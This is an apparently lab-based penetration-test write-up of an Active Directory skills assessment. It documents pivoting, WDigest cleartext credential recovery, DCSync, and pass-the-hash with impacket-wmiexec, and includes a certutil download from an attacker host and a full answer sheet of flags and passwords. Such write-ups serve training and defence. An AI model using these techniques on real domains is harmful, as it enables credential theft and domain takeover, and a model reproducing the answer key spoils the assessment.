## Comprehensive Penetration Testing Report

**Assessment:** Active Directory Enumeration & Attacks Skills Assessment  
**Methodology:** CPTS-style penetration testing methodology  
**Assessment Result:** Completed — 8/8  
**Primary Domain:** `INLANEFREIGHT.LOCAL`  
**Domain Controller:** `DC01` — `172.16.6.3`  
**Member Host:** `MS01` — `172.16.6.50`  
**Attacker Host:** Kali Linux  
**Attacker VPN Address:** `10.10.16.32`  
**Assessment Date:** September 30 – October 1, 2026

---

# 1. Executive Summary

This assessment simulated a multi-stage compromise of an Active Directory environment belonging to the `INLANEFREIGHT.LOCAL` domain.

The engagement progressed from initial access and credential discovery through internal network pivoting, lateral movement, Windows credential exposure, Active Directory permission enumeration, domain replication abuse, and ultimately complete domain compromise.

The principal attack chain was:

```text
Initial Access
      |
      v
Credential Discovery
      |
      v
svc_sql
      |
      v
Chisel Reverse Pivot
      |
      v
Internal Network
      |
      v
MS01 - 172.16.6.50
      |
      v
INLANEFREIGHT\svc_sql
      |
      v
tpetty Interactive Session
      |
      v
WDigest Credential Exposure
      |
      v
tpetty Cleartext Credential
      |
      v
PowerView ACL Enumeration
      |
      v
Replication Rights
      |
      v
DCSync
      |
      v
Administrator NTLM Credential Material
      |
      v
DC01 - 172.16.6.3
      |
      v
Administrator-Level Remote Execution
      |
      v
Administrator Desktop Flag
```

The assessment ultimately demonstrated that the domain user `tpetty` possessed the combination of Active Directory replication permissions required to perform a **DCSync** attack.

DCSync was successfully performed against DC01, resulting in recovery of the domain Administrator's NTLM credential material. That credential material was then used to establish remote execution on DC01.

The final proof of compromise was obtained from:

```text
C:\Users\Administrator\Desktop\flag.txt
```

with the value:

```text
r3plicat1on_m@st3r!
```

This constitutes a complete compromise of the simulated Active Directory domain.

---

# 2. Objectives

The assessment objectives were to:

1. Enumerate the target environment.
    
2. Identify valid credentials.
    
3. Establish access to internal systems.
    
4. Configure and utilize a network pivot.
    
5. Perform lateral movement to MS01.
    
6. Enumerate Windows sessions and users.
    
7. Investigate credential exposure through WDigest.
    
8. Recover credentials associated with an interactive domain user.
    
9. Enumerate Active Directory permissions.
    
10. Identify dangerous delegated privileges.
    
11. Determine what attack `tpetty` could perform.
    
12. Demonstrate DCSync.
    
13. Recover domain credential material.
    
14. Obtain access to DC01.
    
15. Demonstrate domain-level compromise.
    
16. Retrieve the final assessment flag.
    

---

# 3. Scope and Environment

## 3.1 Identified Systems

|System|IP|Function|
|---|--:|---|
|DC01|`172.16.6.3`|Domain Controller|
|MS01|`172.16.6.50`|Windows member system|
|Kali|`10.10.16.32`|Attacker workstation|
|antak|Intermediate compromised system|Pivot / reverse shell|

## 3.2 Domain

```text
INLANEFREIGHT.LOCAL
```

The domain controller identified during the assessment was:

```text
DC01
172.16.6.3
```

The internal Windows host used for lateral movement was:

```text
MS01
172.16.6.50
```

---

# 4. Tools and Technologies

The following tools and technologies were used during the assessment:

### Network / Pivoting

- Chisel
    
- ProxyChains
    
- Netcat
    
- `ss`
    

### Windows / Active Directory

- PowerShell
    
- PowerView
    
- Evil-WinRM
    
- Windows `query user`
    
- Windows Registry Provider
    

### Credential Analysis

- Mimikatz
    
- WDigest
    

### Remote Access

- FreeRDP / `xfreerdp`
    

### Credential / Domain Attacks

- Impacket `secretsdump`
    
- Impacket `wmiexec`
    

### File Transfer

- Evil-WinRM upload functionality
    
- Python HTTP server
    
- PowerShell `Invoke-WebRequest`
    
- Windows `certutil` was tested during troubleshooting but timed out
    

---

# 5. Attack Path Overview

The assessment developed through the following stages:

### Stage 1 — Initial Credential Discovery

The assessment obtained the `svc_sql` account:

```text
Username: svc_sql
Password: lucky7
```

### Stage 2 — Network Pivot

A Chisel reverse tunnel was established through the compromised intermediate system.

The SOCKS listener was:

```text
127.0.0.1:1080
```

### Stage 3 — Lateral Movement

The pivot enabled access to:

```text
MS01
172.16.6.50
```

The account used on MS01 was:

```text
INLANEFREIGHT\svc_sql
```

### Stage 4 — Credential Discovery

An interactive `tpetty` session was identified on MS01.

Initially, WDigest returned:

```text
Password : (null)
```

### Stage 5 — WDigest Configuration

`UseLogonCredential` was enabled and MS01 was restarted.

### Stage 6 — Credential Recovery

After reboot, Mimikatz showed the cleartext password for `tpetty`.

### Stage 7 — Active Directory Enumeration

PowerView was used to enumerate `tpetty`'s domain ACL permissions.

Three replication-related rights were identified.

### Stage 8 — DCSync

The replication permissions were used to perform DCSync against DC01.

### Stage 9 — Domain Administrator Credential Material

The Administrator NTLM credential material was recovered.

### Stage 10 — Domain Controller Access

Impacket WMI execution was used to obtain a command shell on DC01.

### Stage 11 — Final Proof

The Administrator Desktop flag was retrieved.

---

# 6. Initial Access and Credential Discovery

The assessment identified the `svc_sql` account and associated password:

```text
svc_sql
lucky7
```

These credentials became the basis for subsequent access to MS01.

The assessment answer associated with this stage was:

### Q2

```text
svc_sql
```

### Q3

```text
lucky7
```

---

# 7. Initial Assessment Findings

The assessment also identified the following answer during the early enumeration stages:

### Q1

```text
JusT_g3tt1ng_st@rt3d!
```

### Q4

```text
spn$_r0ast1ng_on_@n_0p3n_f1re
```

### Q5

```text
tpetty
```

The exact original command/output transcript for every individual Q1–Q5 discovery step is not preserved in the currently retrievable portion of the conversation. Therefore, those answers are recorded as confirmed assessment results, while no unsupported command sequence is fabricated for them.

---

# 8. Chisel Pivot

The internal network required a pivot from the attacker system.

The architecture was:

```text
Kali
10.10.16.32
     |
     | Chisel reverse connection
     v
antak
     |
     v
Internal Network
     |
     +----------------+
     |                |
     v                v
MS01               DC01
172.16.6.50        172.16.6.3
```

Chisel was configured to provide a SOCKS proxy on Kali.

The local proxy endpoint was:

```text
127.0.0.1:1080
```

ProxyChains was then used to route internal traffic through the tunnel.

The working route was validated by successful connections to internal services on MS01 and later DC01.

---

# 9. File Transfer and Tool Deployment

The assessment required deployment of tools to the internal Windows environment.

The tools transferred included:

```text
chisel.exe
PowerView.ps1
mimikatz.exe
```

During the assessment, `certutil` was initially attempted for file transfer:

```powershell
certutil.exe -urlcache -split -f http://10.10.17.228:8001/PowerView.ps1 C:\Windows\Temp\PowerView.ps1
```

This resulted in:

```text
ERROR_WINHTTP_TIMEOUT
```

An alternative transfer mechanism was subsequently used.

The Python HTTP server was started from Kali:

```bash
python3 -m http.server 8001
```

The tools were then successfully transferred.

The resulting MS01 working directory contained:

```text
PowerView.ps1
mimikatz.exe
```

Chisel was also successfully transferred, and its version was confirmed as:

```text
1.12.0-rc3
```

---

# 10. Lateral Movement to MS01

Access to MS01 was established using the recovered `svc_sql` credentials.

The system was confirmed with:

```cmd
hostname
```

Output:

```text
MS01
```

The account context was confirmed using:

```cmd
whoami
```

Output:

```text
inlanefreight\svc_sql
```

The assessment therefore established authenticated access to MS01 as:

```text
INLANEFREIGHT\svc_sql
```

---

# 11. Interactive Session Enumeration

The following command was used:

```cmd
query user
```

The assessment identified:

```text
USERNAME   SESSIONNAME   ID   STATE
tpetty     console       1    Active
svc_sql    rdp-tcp#1     2    Active
```

This was significant because the `tpetty` account was actively logged on interactively to MS01.

The `tpetty` account became the target for credential discovery.

---

# 12. Process Enumeration

PowerShell was used to identify processes belonging to `tpetty`:

```powershell
Get-Process -IncludeUserName |
Where-Object {$_.UserName -like '*tpetty*'} |
Select-Object Id,ProcessName,UserName,SessionId
```

Processes associated with the user included:

```text
ctfmon
explorer
LockApp
RuntimeBroker
SearchUI
ShellExperienceHost
sihost
svchost
taskhostw
vmtoolsd
```

All were associated with:

```text
INLANEFREIGHT\tpetty
SessionId 1
```

This confirmed a genuine interactive desktop session.

---

# 13. WDigest Investigation

Mimikatz was used to inspect credential material associated with the interactive session.

Initially the `tpetty` credential record showed:

```text
User Name : tpetty
Domain    : INLANEFREIGHT

wdigest :
    * Username : tpetty
    * Domain   : INLANEFREIGHT
    * Password : (null)
```

This demonstrated that the desired cleartext credential was not initially available.

---

# 14. WDigest Registry Analysis

The following registry path was examined:

```text
HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
```

The initial output contained:

```text
Debuglevel
Negotiate
UTF8HTTP
UTF8SASL
DigestEncryptionAlgorithms
```

but did not contain:

```text
UseLogonCredential
```

The property was therefore created/enabled:

```powershell
New-ItemProperty `
-Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' `
-Name UseLogonCredential `
-PropertyType DWORD `
-Value 1 `
-Force
```

The result confirmed:

```text
UseLogonCredential : 1
```

---

# 15. Reboot Requirement

An important troubleshooting point during the assessment was determining that simply logging off the `tpetty` session was not sufficient for the intended lab sequence.

The assessment initially considered logging off session 1:

```cmd
logoff 1
```

This removed the existing `tpetty` session.

However, after reviewing the assessment walkthrough, the correct sequence was identified as:

1. Enable `UseLogonCredential`.
    
2. Reboot MS01.
    
3. Reconnect.
    
4. Allow the required interactive authentication to occur.
    
5. Re-run credential analysis.
    

MS01 was therefore restarted:

```powershell
Restart-Computer -Force
```

After reboot, the WDigest configuration was confirmed again.

---

# 16. Post-Reboot Credential Recovery

After the reboot, the `tpetty` interactive session had a new logon time:

```text
9/30/2026 11:18:34 PM
```

Mimikatz then returned:

```text
Authentication Id : 0 ; 180415
Session           : Interactive from 1
User Name         : tpetty
Domain            : INLANEFREIGHT
Logon Server       : DC01
```

The WDigest section now contained:

```text
wdigest :
    * Username : tpetty
    * Domain   : INLANEFREIGHT
    * Password : Sup3rS3cur3D0m@inU2eR
```

This successfully resolved Q6.

---

# 17. Q6 — Cleartext Password

The recovered password was:

```text
Sup3rS3cur3D0m@inU2eR
```

### Q6 Answer

```text
Sup3rS3cur3D0m@inU2eR
```

---

# 18. PowerView Active Directory Enumeration

PowerView was transferred to MS01 and loaded into PowerShell.

The objective was to determine what privileges the compromised user could exercise in Active Directory.

The SID of `tpetty` was obtained:

```powershell
$sid = (Get-DomainUser -Identity tpetty).objectsid
```

The first ACL query returned three `ExtendedRight` entries, but the important fields were not immediately visible.

The output was therefore expanded using:

```powershell
Get-DomainObjectACL `
-Identity "DC=INLANEFREIGHT,DC=LOCAL" `
-ResolveGUIDs |
Where-Object {$_.SecurityIdentifier -eq $sid} |
Format-List *
```

This exposed the actual extended-right names.

---

# 19. Replication Rights Identified

The first ACE showed:

```text
ObjectAceType :
DS-Replication-Get-Changes-In-Filtered-Set
```

The second showed:

```text
ObjectAceType :
DS-Replication-Get-Changes
```

The third showed:

```text
ObjectAceType :
DS-Replication-Get-Changes-All
```

All three were:

```text
AceQualifier          : AccessAllowed
ActiveDirectoryRights : ExtendedRight
AccessControlType     : AccessAllowed
```

and were directly associated with the `tpetty` SID.

---

# 20. Interpretation of the ACL

The combination of:

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
DS-Replication-Get-Changes-In-Filtered-Set
```

is the critical permission set associated with the ability to abuse Active Directory replication and perform **DCSync**.

This provided an independently derived answer to Q7.

---

# 21. Q7 — Attack Identification

### Q7 Answer

```text
DCSync
```

This answer was derived directly from the actual ACL output obtained during the assessment.

---

# 22. DCSync Against DC01

The DCSync operation was executed against:

```text
DC01
172.16.6.3
```

The operation successfully reached the target through the Chisel/ProxyChains pivot.

The output confirmed:

```text
Dumping Domain Credentials
Using the DRSUAPI method to get NTDS.DIT secrets
```

The attack successfully retrieved domain credential material.

---

# 23. Administrator Credential Material

The following entry was obtained:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
```

The Administrator NTLM credential material was:

```text
27dedb1dab4d8545c6e1c66fba077da0
```

This represented a major escalation in privilege.

The attack had moved from compromise of a member server to extraction of domain-level credential material from the domain controller.

---

# 24. Remote Execution on DC01

The recovered Administrator credential material was used with Impacket WMI execution through the existing SOCKS pivot.

The connection command was:

```bash
proxychains4 impacket-wmiexec \
  -hashes ':27dedb1dab4d8545c6e1c66fba077da0' \
  'INLANEFREIGHT.LOCAL/Administrator@172.16.6.3'
```

ProxyChains confirmed successful connections to:

```text
172.16.6.3:445
172.16.6.3:135
```

The tool then returned:

```text
SMBv3.0 dialect used
Launching semi-interactive shell
```

A command shell was successfully obtained on DC01.

---

# 25. Final Flag Retrieval

The final objective was to retrieve:

```text
C:\Users\Administrator\Desktop\flag.txt
```

The command executed was:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

The result was:

```text
r3plicat1on_m@st3r!
```

This provided definitive proof of domain-level compromise.

---

# 26. Q8 — Final Flag

### Q8 Answer

```text
r3plicat1on_m@st3r!
```

---

# 27. Complete Assessment Answer Sheet

|Question|Answer|Evidence / Source|
|---|---|---|
|Q1|`JusT_g3tt1ng_st@rt3d!`|Confirmed assessment answer|
|Q2|`svc_sql`|Credential/account identified during assessment|
|Q3|`lucky7`|Password used for `svc_sql` access|
|Q4|`spn$_r0ast1ng_on_@n_0p3n_f1re`|Confirmed assessment answer|
|Q5|`tpetty`|Interactive user identified on MS01|
|Q6|`Sup3rS3cur3D0m@inU2eR`|WDigest/Mimikatz after reboot|
|Q7|`DCSync`|Confirmed independently through PowerView ACLs|
|Q8|`r3plicat1on_m@st3r!`|Retrieved from DC01 Administrator Desktop|

---

# 28. Detailed Attack Narrative

## 28.1 Initial Access

The assessment began with identification of usable credentials associated with the `svc_sql` account.

The account and password were:

```text
svc_sql
lucky7
```

This provided a valid identity for progressing into the Windows environment.

## 28.2 Pivot

Direct access to the internal network was not available from Kali.

A compromised intermediate host (`antak`) was therefore used to establish a Chisel reverse tunnel.

The resulting SOCKS endpoint was:

```text
127.0.0.1:1080
```

ProxyChains routed subsequent internal connections through this tunnel.

## 28.3 MS01

The pivot provided access to MS01:

```text
172.16.6.50
```

The session operated as:

```text
INLANEFREIGHT\svc_sql
```

## 28.4 Credential Discovery

The system had an active interactive session belonging to:

```text
INLANEFREIGHT\tpetty
```

Mimikatz initially showed no WDigest cleartext password.

## 28.5 WDigest

The WDigest registry configuration lacked `UseLogonCredential`.

The property was enabled.

MS01 was then rebooted to ensure the required credential caching behavior occurred during a new authentication.

## 28.6 tpetty

Following reboot, Mimikatz exposed:

```text
Sup3rS3cur3D0m@inU2eR
```

for `tpetty`.

## 28.7 Active Directory ACL Enumeration

PowerView was used to inspect the domain object's ACL for the `tpetty` SID.

The following replication rights were found:

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
DS-Replication-Get-Changes-In-Filtered-Set
```

These established DCSync capability.

## 28.8 DCSync

The domain controller was queried through DRSUAPI.

The domain Administrator credential material was recovered.

## 28.9 Domain Controller

The Administrator NTLM credential material was used to obtain a WMI shell on DC01.

## 28.10 Proof

The Administrator Desktop flag was retrieved.

---

# 29. Security Findings

## Finding 01 — WDigest Credential Exposure

**Severity:** High

### Description

The environment permitted WDigest credential caching to be enabled, allowing cleartext credentials associated with an interactive domain user to become available following a new authentication.

### Evidence

```text
tpetty
INLANEFREIGHT
Sup3rS3cur3D0m@inU2eR
```

### Impact

An attacker with sufficient local access could potentially recover reusable domain credentials from LSASS.

### Recommendation

- Disable legacy WDigest credential caching.
    
- Ensure `UseLogonCredential` is not enabled.
    
- Deploy current Windows security baselines.
    
- Use Credential Guard where supported.
    
- Restrict administrative access to servers.
    
- Minimize interactive logons on servers.
    

---

# 30. Security Finding 02 — Excessive Directory Replication Rights

**Severity:** Critical

### Description

`tpetty` possessed all of the relevant replication rights required for DCSync.

### Evidence

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
DS-Replication-Get-Changes-In-Filtered-Set
```

### Impact

The permissions allowed domain credential material to be retrieved from DC01.

The assessment subsequently recovered the Administrator NTLM credential material.

### Recommendation

Review all principals with these rights and remove them unless explicitly required.

Particular attention should be paid to:

- User accounts
    
- Service accounts
    
- Non-administrative groups
    
- Recently modified ACLs
    
- Unexpected delegated permissions
    

---

# 31. Security Finding 03 — Excessive Credential Exposure

**Severity:** High

### Description

The compromise demonstrated that credentials exposed on an internal system could be leveraged to move deeper into the Active Directory environment.

### Impact

Credential compromise can produce a cascading compromise when the affected identity has privileged directory permissions.

### Recommendation

- Use least privilege.
    
- Separate service accounts from interactive accounts.
    
- Restrict interactive logons for service accounts.
    
- Use managed service accounts where appropriate.
    
- Rotate credentials after suspected compromise.
    
- Monitor privileged credential usage.
    

---

# 32. Security Finding 04 — Excessive Internal Reachability

**Severity:** High

### Description

A compromised intermediate system was able to provide network access to internal hosts through a reverse SOCKS tunnel.

### Impact

The pivot enabled access to MS01 and DC01 that was otherwise unavailable directly from the attacker network.

### Recommendation

- Segment critical infrastructure.
    
- Restrict SMB and RPC access.
    
- Restrict WMI access.
    
- Limit RDP exposure.
    
- Use host-based firewalls.
    
- Monitor unusual outbound connections.
    
- Monitor proxy/tunneling behavior.
    

---

# 33. Security Finding 05 — Domain Credential Extraction

**Severity:** Critical

### Description

The combination of excessive replication permissions and the ability to perform DCSync resulted in recovery of domain Administrator credential material.

### Impact

The recovered credential material was sufficient to obtain remote execution on DC01.

This represents full domain compromise.

### Recommendation

- Remove unnecessary replication permissions.
    
- Rotate exposed privileged credentials.
    
- Implement privileged access management.
    
- Deploy tiered administration.
    
- Protect domain controllers.
    
- Monitor replication activity.
    
- Monitor privileged access to DC01.
    
- Implement LSASS protections and Credential Guard where appropriate.
    

---

# 34. Defensive Detection Recommendations

## WDigest

Monitor for unexpected changes to:

```text
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
```

particularly:

```text
UseLogonCredential
```

## LSASS

Monitor for:

- Unexpected LSASS access
    
- Credential-dumping tools
    
- Suspicious PowerShell activity
    
- Unsigned processes accessing LSASS
    

## DCSync

Monitor directory replication events and identify accounts making replication requests that are not expected to do so.

Audit all principals assigned:

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
DS-Replication-Get-Changes-In-Filtered-Set
```

## Lateral Movement

Monitor:

```text
SMB / 445
RPC / 135
WMI
RDP / 3389
```

for unusual authentication patterns.

## Chisel / SOCKS Pivoting

Monitor for:

- Unexpected long-lived outbound TCP connections
    
- SOCKS/proxy behavior
    
- Unknown tunneling binaries
    
- Reverse connections to external infrastructure
    
- Internal scanning originating from compromised hosts
    

---

# 35. Remediation Plan

## Immediate

1. Remove unnecessary replication rights from `tpetty`.
    
2. Rotate `tpetty` credentials.
    
3. Rotate `svc_sql` credentials.
    
4. Rotate the domain Administrator credential.
    
5. Review other accounts for the same replication permissions.
    
6. Review DC01 authentication logs.
    

## Short Term

1. Disable unnecessary WDigest credential caching.
    
2. Harden LSASS.
    
3. Implement Credential Guard where supported.
    
4. Restrict interactive logons for service accounts.
    
5. Implement privileged account separation.
    
6. Restrict WMI/SMB/RPC between network segments.
    

## Long Term

1. Implement Active Directory tiered administration.
    
2. Regularly audit privileged ACLs.
    
3. Implement privileged access management.
    
4. Monitor directory replication.
    
5. Implement centralized endpoint detection.
    
6. Regularly conduct internal penetration testing.
    
7. Establish credential rotation procedures after security incidents.
    

---

# 36. Lessons Learned

The assessment demonstrated several important Active Directory attack-chain concepts:

### 36.1 A low-level foothold can become domain compromise

The initial `svc_sql` access did not itself represent domain administrator access.

However, the combination of:

```text
Initial Credentials
+
Network Pivot
+
Interactive User Session
+
Credential Exposure
+
AD ACL Misconfiguration
```

created a path to complete domain compromise.

### 36.2 Context matters when troubleshooting credentials

The initial WDigest result was:

```text
Password : (null)
```

Simply logging off the existing user session was not sufficient for the assessment's intended sequence.

The required behavior was achieved after enabling `UseLogonCredential` and rebooting MS01.

### 36.3 ACL enumeration can reveal domain takeover paths

The three replication rights were the decisive evidence:

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
DS-Replication-Get-Changes-In-Filtered-Set
```

The attack capability could therefore be determined from the ACL itself.

### 36.4 DCSync does not require Domain Administrator membership

The assessment demonstrated that an account with the necessary replication rights can request domain credential material without being a conventional Domain Administrator.

This makes inappropriate replication permissions particularly dangerous.

---

# 37. Final Attack Graph

```text
                         KALI
                    10.10.16.32
                         |
                         |
                    Chisel Pivot
                         |
                         v
                      ANTAK
                         |
                         |
                 Internal Network
                         |
             +-----------+-----------+
             |                       |
             v                       v
           MS01                    DC01
       172.16.6.50             172.16.6.3
             |
             |
       svc_sql / lucky7
             |
             v
       tpetty session
             |
             v
          WDigest
             |
             v
  Sup3rS3cur3D0m@inU2eR
             |
             v
       PowerView ACL
             |
             v
    Replication Rights
             |
             v
          DCSync
             |
             v
 Administrator NTLM
 27dedb1dab4d8545c6e1c66fba077da0
             |
             v
       WMI on DC01
             |
             v
    Administrator Shell
             |
             v
       flag.txt
             |
             v
   r3plicat1on_m@st3r!
```

---

# 38. Final Assessment Results

The assessment was completed successfully.

```text
Q1  JusT_g3tt1ng_st@rt3d!
Q2  svc_sql
Q3  lucky7
Q4  spn$_r0ast1ng_on_@n_0p3n_f1re
Q5  tpetty
Q6  Sup3rS3cur3D0m@inU2eR
Q7  DCSync
Q8  r3plicat1on_m@st3r!
```

**Result: 8/8 questions completed.**

---

# 39. Conclusion

The assessment successfully demonstrated a complete Active Directory compromise.

The initial access was leveraged to reach MS01 through a Chisel-based network pivot. Once on MS01, an active `tpetty` session was identified. WDigest configuration was investigated and modified in accordance with the assessment scenario. After rebooting MS01, the cleartext `tpetty` credential was recovered.

PowerView was then used to independently enumerate the domain ACL associated with `tpetty`. The account possessed three replication-related extended rights:

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
DS-Replication-Get-Changes-In-Filtered-Set
```

These permissions established that `tpetty` could perform DCSync.

DCSync was subsequently demonstrated against DC01 and returned the domain Administrator's NTLM credential material. The credential material was used through the established pivot to obtain remote WMI execution on DC01.

Finally, the Administrator Desktop flag was retrieved:

```text
r3plicat1on_m@st3r!
```

The assessment therefore demonstrated **full domain compromise**, with the primary root cause being excessive Active Directory replication privileges combined with credential exposure and insufficient privilege separation.

**Assessment Status: COMPLETE — 8/8**